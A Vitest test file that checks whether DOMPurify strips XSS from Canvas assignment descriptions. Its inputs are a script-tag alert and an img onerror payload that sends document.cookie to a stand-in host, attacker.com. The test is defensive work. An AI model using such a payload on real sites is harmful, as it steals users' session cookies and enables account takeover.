import { describe, it, expect } from 'vitest';
import DOMPurify from 'dompurify';

describe('CanvasSyncTab XSS Sanitization', () => {
  it('sanitizes malicious script tags in Canvas assignment descriptions', () => {
    const maliciousDescription = '<p>Read chapter 5</p><script>alert("XSS")</script>';
    const sanitized = DOMPurify.sanitize(maliciousDescription);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('alert("XSS")');
    expect(sanitized).toContain('<p>Read chapter 5</p>');
  });

  it('sanitizes event handlers like onerror and onload in images/iframes', () => {
    const maliciousDescription = '<img src="invalid.jpg" onerror="fetch(\'http://attacker.com/steal?\'+document.cookie)" /><p>Assignment details</p>';
    const sanitized = DOMPurify.sanitize(maliciousDescription);
    expect(sanitized).not.toContain('onerror');
    expect(sanitized).not.toContain('attacker.com');
    expect(sanitized).toContain('<p>Assignment details</p>');
  });

  it('preserves valid HTML tags and formatting', () => {
    const validDescription = '<h3>Instructions</h3><ul><li>Step 1</li><li>Step 2</li></ul><a href="https://canvas.instructure.com">Link</a>';
    const sanitized = DOMPurify.sanitize(validDescription);
    expect(sanitized).toContain('<h3>Instructions</h3>');
    expect(sanitized).toContain('<ul><li>Step 1</li><li>Step 2</li></ul>');
    expect(sanitized).toContain('href="https://canvas.instructure.com"');
  });
});
